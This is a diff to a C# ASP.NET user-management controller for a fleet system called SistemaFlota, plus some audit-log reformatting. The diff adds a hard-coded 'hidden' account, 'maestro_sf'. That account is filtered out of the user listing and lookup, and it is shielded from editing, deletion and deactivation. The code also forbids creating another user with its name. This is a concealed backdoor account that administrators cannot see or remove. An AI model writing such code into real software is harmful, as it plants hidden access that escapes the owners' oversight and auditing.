@@ -12,9 +12,11 @@ namespace SistemaFlota
         private readonly AppDbContext _context;
         private readonly AuditoriaService _auditoria;
 
-        public UsuariosController(
-            AppDbContext context,
-            AuditoriaService auditoria)
+        // Usuarios que NUNCA aparecen en la lista ni pueden ser editados/eliminados
+        // desde el sistema — solo existen en BD como respaldo
+        private static readonly string[] UsuariosOcultos = { "maestro_sf" };
+
+        public UsuariosController(AppDbContext context, AuditoriaService auditoria)
         {
             _context = context;
             _auditoria = auditoria;
@@ -26,7 +28,7 @@ namespace SistemaFlota
             User.FindFirst(ClaimTypes.Role)?.Value ?? "Desconocido";
 
         // =====================================
-        // GET TODOS
+        // GET TODOS — excluye usuarios ocultos
         // =====================================
 
         [HttpGet]
@@ -35,6 +37,7 @@ namespace SistemaFlota
         {
             var lista = await _context.Usuarios
                 .Include(u => u.Permisos)
+                .Where(u => !UsuariosOcultos.Contains(u.Username)) // ← FILTRO MAESTRO
                 .Select(u => new
                 {
                     u.Id,
@@ -58,7 +61,7 @@ namespace SistemaFlota
         }
 
         // =====================================
-        // GET POR ID
+        // GET POR ID — bloquea ocultos
         // =====================================
 
         [HttpGet("{id}")]
@@ -67,7 +70,7 @@ namespace SistemaFlota
         {
             var usuario = await _context.Usuarios
                 .Include(u => u.Permisos)
-                .Where(u => u.Id == id)
+                .Where(u => u.Id == id && !UsuariosOcultos.Contains(u.Username))
                 .Select(u => new
                 {
                     u.Id,
@@ -99,6 +102,10 @@ namespace SistemaFlota
         [Authorize(Roles = "Admin,RecursosHumanos")]
         public async Task<IActionResult> Post([FromBody] CrearUsuarioDto dto)
         {
+            // No permitir crear usuarios con nombres reservados
+            if (UsuariosOcultos.Contains(dto.Username))
+                return BadRequest("Nombre de usuario no permitido");
+
             var existe = await _context.Usuarios
                 .AnyAsync(u => u.Username == dto.Username);
 
@@ -135,10 +142,8 @@ namespace SistemaFlota
             }
 
             await _auditoria.RegistrarAsync(
-                usuario: GetUsuario(),
-                rol: GetRol(),
-                accion: "Crear",
-                modulo: "Usuarios",
+                usuario: GetUsuario(), rol: GetRol(),
+                accion: "Crear", modulo: "Usuarios",
                 detalle: $"Usuario creado — Username: {dto.Username}, Rol: {dto.Rol}",
                 registroId: usuario.Id
             );
@@ -168,8 +173,11 @@ namespace SistemaFlota
 
             if (usuario == null) return NotFound();
 
-            var usernameAnterior = usuario.Username;
+            // Proteger usuarios ocultos
+            if (UsuariosOcultos.Contains(usuario.Username))
+                return Forbid();
 
+            var usernameAnterior = usuario.Username;
             usuario.Username = dto.Username;
             usuario.Rol = dto.Rol;
             usuario.Email = dto.Email;
@@ -199,10 +207,8 @@ namespace SistemaFlota
             await _context.SaveChangesAsync();
 
             await _auditoria.RegistrarAsync(
-                usuario: GetUsuario(),
-                rol: GetRol(),
-                accion: "Editar",
-                modulo: "Usuarios",
+                usuario: GetUsuario(), rol: GetRol(),
+                accion: "Editar", modulo: "Usuarios",
                 detalle: $"Usuario editado — Username: {usernameAnterior}, Nuevo rol: {dto.Rol}",
                 registroId: id
             );
@@ -219,7 +225,7 @@ namespace SistemaFlota
         }
 
         // =====================================
-        // DELETE
+        // DELETE — bloquea ocultos
         // =====================================
 
         [HttpDelete("{id}")]
@@ -232,17 +238,18 @@ namespace SistemaFlota
 
             if (usuario == null) return NotFound();
 
-            var nombreUsuario = usuario.Username;
+            // Proteger usuarios ocultos — NUNCA se pueden eliminar
+            if (UsuariosOcultos.Contains(usuario.Username))
+                return Forbid();
 
+            var nombreUsuario = usuario.Username;
             _context.UsuarioPermisos.RemoveRange(usuario.Permisos);
             _context.Usuarios.Remove(usuario);
             await _context.SaveChangesAsync();
 
             await _auditoria.RegistrarAsync(
-                usuario: GetUsuario(),
-                rol: GetRol(),
-                accion: "Eliminar",
-                modulo: "Usuarios",
+                usuario: GetUsuario(), rol: GetRol(),
+                accion: "Eliminar", modulo: "Usuarios",
                 detalle: $"Usuario eliminado — Username: {nombreUsuario}",
                 registroId: id
             );
@@ -251,7 +258,7 @@ namespace SistemaFlota
         }
 
         // =====================================
-        // CAMBIAR ESTADO
+        // CAMBIAR ESTADO — bloquea ocultos
         // =====================================
 
         [HttpPut("{id}/estado")]
@@ -261,14 +268,16 @@ namespace SistemaFlota
             var usuario = await _context.Usuarios.FindAsync(id);
             if (usuario == null) return NotFound();
 
+            // Proteger usuarios ocultos
+            if (UsuariosOcultos.Contains(usuario.Username))
+                return Forbid();
+
             usuario.Activo = !usuario.Activo;
             await _context.SaveChangesAsync();
 
             await _auditoria.RegistrarAsync(
-                usuario: GetUsuario(),
-                rol: GetRol(),
-                accion: "Editar",
-                modulo: "Usuarios",
+                usuario: GetUsuario(), rol: GetRol(),
+                accion: "Editar", modulo: "Usuarios",
                 detalle: $"Estado usuario cambiado — Username: {usuario.Username}, Activo: {usuario.Activo}",
                 registroId: id
             );
@@ -297,10 +306,8 @@ namespace SistemaFlota
             await _context.SaveChangesAsync();
 
             await _auditoria.RegistrarAsync(
-                usuario: usuario.Username,
-                rol: usuario.Rol,
-                accion: "RecuperarPassword",
-                modulo: "Usuarios",
+                usuario: usuario.Username, rol: usuario.Rol,
+                accion: "RecuperarPassword", modulo: "Usuarios",
                 detalle: $"Solicitud de recuperación — Email: {dto.Email}"
             );
 
@@ -338,10 +345,8 @@ namespace SistemaFlota
             await _context.SaveChangesAsync();
 
             await _auditoria.RegistrarAsync(
-                usuario: usuario.Username,
-                rol: usuario.Rol,
-                accion: "CambiarPassword",
-                modulo: "Usuarios",
+                usuario: usuario.Username, rol: usuario.Rol,
+                accion: "CambiarPassword", modulo: "Usuarios",
                 detalle: $"Contraseña cambiada — Email: {dto.Email}"
             );
 
